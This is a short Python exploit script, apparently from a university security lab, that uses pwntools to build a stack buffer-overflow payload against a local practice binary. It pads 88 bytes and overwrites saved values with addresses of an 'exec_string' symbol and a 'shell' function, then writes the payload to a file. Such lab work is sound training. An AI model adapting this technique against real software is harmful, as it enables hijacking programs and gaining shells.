import pwn
binary = pwn.ELF('./CS18B040_CS18B050_2')
shell = binary.functions['shell'].address
#arg1 = list(binary.search(b'/bin/sh'))[0]
arg1 = binary.symbols['exec_string']
payload = pwn.cyclic(88) + pwn.p32(arg1 - 0x8) + pwn.p32(shell + 0x3)
open('CS18B040_CS18B050_2.exp', 'wb').write(payload)
